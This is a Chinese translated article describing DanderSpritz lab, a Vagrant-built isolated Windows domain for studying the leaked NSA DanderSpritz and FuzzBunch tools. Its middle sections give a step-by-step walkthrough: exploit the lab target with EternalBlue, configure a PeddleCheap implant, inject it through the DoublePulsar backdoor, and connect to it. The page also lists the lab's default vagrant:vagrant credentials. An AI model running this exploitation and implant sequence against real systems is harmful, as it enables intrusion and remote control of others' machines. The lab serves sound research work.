**DanderSpritz是NSA泄露的一款著名的界面化远控工具，由于其功能强大因此也成为了许多安全人员争相研究的对象。但在实际测试过程中，由于缺少说明文档，所以问题也层出不穷。而DanderSpritz
lab就是为了解决这些问题而被开发出来的。DanderSpritz
lab能够让安全研究人员轻松构建和配置功能齐全的DanderSpritz实验环境，以进行相关的逆向及研究测试工作。**

关于DanderSpritz lab的介绍可以阅读这篇文章：<https://medium.com/@francisck/introducing-danderspritz-lab-461912313d7c>

以及我为DanderSpritz创建的文档网站：<https://danderspritz.com>

 **警告：** 本实验环境未执行任何形式的安全加固，并以默认的vagrant凭据运行。因此，请不要将该实验环境连接/桥接到任何重要的网络当中！

 **安装环境及软件版本要求：**

> 20GB以上的可用磁盘空间
>
> 8GB以上的内存
>
> 20GB带宽使用（下载ISO，更新，服务包等）
>
> [Packer](https://www.packer.io/docs/install/index.html) v1.2.3或更高版本
>
> [Vagrant](https://www.vagrantup.com/downloads.html) v2.1.1或更高版本
>
> [Vagrant-Reload](https://github.com/aidanns/vagrant-reload)插件
>
> Virtualbox（VMWare Fusion/Workstation）

## 启动DanderSpritz Lab

DanderSpritz使用Packer，Vagrant和Vagrant-reload插件来安装和配置实验环境。Packer将直接从Microsoft下载Windows ISO并安装该软件的试用版，以供后续的研究测试使用。

1.克隆DanderSpritz lab存储库到你的机器：git clone
git@github.com:francisck/DanderSpritz_lab.git

2.确保你已安装Vagrant-reload插件 vagrant plugin install vagrant-reload

3.运行packer build danderspritz_lab.json命令，下载ISO并构建Vagrant box

4.Vagrant box构建完成后，启动虚拟机：vagrant up

### 创建一个FuzzBunch项目

1.启动cmd并执行命令：D:\python fb.py

2.设置默认 **target** 地址192.168.40.3

3.设置默认 **callback** 地址192.168.40.4

4.不要使用重定向（起初）

5.保留默认日志目录

6.创建一个新项目（选项0）

7.为新项目命名

8.保留默认日志目录

![1Fuzzbunch_project.png](https://image.3001.net/images/20180628/15301512637170.png!small)

 **目标利用**

1.使用EternalBlue利用目标机器：use eternalblue

2.选择所有选项为默认，除传输机制外(delivery mechanism)。使用“FB”（传统部署）作为传输机制。

3.一旦eternalblue利用成功，配置danderspritz和peddlecheap

 **配置并启动DanderSpritz**

1.另外启动一个cmd并执行命令：D:\python configure_lp

2.允许Java通过防火墙

3.选择"Log directory" 旁的browse，并选择你创建的FuzzBunch项目名称

![2DSZ_logs.png](https://image.3001.net/images/20180628/15301512869024.png!small)4.点击"go"

### PeddleCheap准备（配置implant）

1.在DanderSpritz控制台中，执行命令：pc_prep

2.选择standard x64-winnt level 3 sharedlib payload 5

3.不要选择高级设置

4.选择执行立即回调（immediate callback）

5.使用默认的PC ID (0)

6.选择"Yes"

7.不要更改侦听端口

8.保留默认的 "callback" 地址（127.0.0.1）

9.不要更改exe名称

10.使用默认key（选项2）

11.验证PeddleCheap配置是否有效

12.不要使用FC (felonycrowbar)进行配置

13.复制配置的二进制文件的位置：

![3pc_config.png](https://image.3001.net/images/20180628/15301513323699.png!small)

 **通过DoublePulsar后门传输implant (peddlecheap)**

1.在Fuzzbunch窗口中输入命令：use doublepulsar

2.当询问你是否希望变量设置提示时选择 "yes"

3.选择所有变量设置为默认，除目标架构外（选项1）1) x64 x64 64-bits

4.选择“RunDLL”（选项2）2）RunDLL使用APC将DLL注入用户模式进程

![4Doublepulsar_config.png](https://image.3001.net/images/20180628/15301513994607.png!small)5.当询问你是否需要执行插件时，将所有其他选项保留为默认值并选择"Yes"

6.你应该能看到 "Doublepulsar succeeded"的提示

 **使用DanderSpritz连接PeddleCheap implant**

1.在DanderSpritz界面的最上方选择“PeddleCheap”

2.从key下拉菜单中选择 "default" key

3.输入目标机器地址（192.168.40.3）

4.选择 "Connect to target"

![5Peddlecheap_connect.png](https://image.3001.net/images/20180628/15301514508226.png!small)5.选择你的Fuzzbunch项目名称

6.等待[DanderSpritz Survey](https://medium.com/francisck/the-equation-groups-post-exploitation-tools-danderspritz-and-more-part-1-a1a6372435cd)完成（这里可能需要等待一段时间）

### Vagrant **基本使用命令**

Bring up所有的DanderSprotz Lab主机：vagrant up

Bring up一个特定主机：vagrant up <hostname>

重启特定主机：vagrant reload <hostname>

重启特定主机并重新运行provision进程：vagrant reload <hostname> \--provision

销毁特定主机：vagrant destroy <hostname>

销毁整个Danderspritz Lab环境：vagrant destroy

客户机快照：vagrant snapshot save <hostname> <snapshot_name>

恢复快照：vagrant snapshot restore <hostname> <snapshot_name>

主机状态检查：vagrant status

暂停实验室环境：vagrant suspend

恢复实验室环境：vagrant resume

 **许可证过期**

在许可证即将过期时，你可以通过在具有管理员权限的命令提示符中用rearm命令后重启电脑。根据微软官方文档中的声明，该命令最多可以重复使用三次，即最多可以再获得90天的windows使用许可。

    
    
    `slmgr /rearm'

## Lab信息

 **Lab图示**

**![6DanderSpritz_lab.png](https://image.3001.net/images/20180628/15301515023216.png!small)**

 **Lab相关信息**

域名：windomain.local

管理员登录（所有机器）：vagrant:vagrant

DC（域控制器）：192.168.40.2/24

目标：192.168.40.3/24

DanderSpritz：192.168.40.4/24

## Lab主机

### DC - Windows 2008 R2域控制器

用于Windomain.local的Windows域控制器

WEF Server Configuration GPO

Enhanced Auditing GPO

PowerShell logging GPO

###  **目标 - Windows 7 Workstation**

模拟目标 workstation / machine

加入Windomain.local Windows AD域

预安装了一些逆向/可视化工具

Chocolatey包管理工具，可用于进一步的工具安装

###  **DanderSpritz Box - Windows 10**

DanderSprirtz & Fuzzbunch 预安装

##  **目标上安装的工具（Windows 7 SP1）**

Sysmon

Sysinternal Tools (Procmon, TCPview, etc)

API Monitor

InfoPe

HxD

PEView

Windbg

WireShark

Binary Ninja

HashCalc

IDA 7 Free

Ollydbg

Enhanced Auditing GPO

PowerShell logging GPO

Windows事件转发到域控制器(WEC)

 ***参考来源：[GitHub](https://github.com/francisck/DanderSpritz_lab)，FB小编 secist
编译，转载请注明来自FreeBuf.COM**

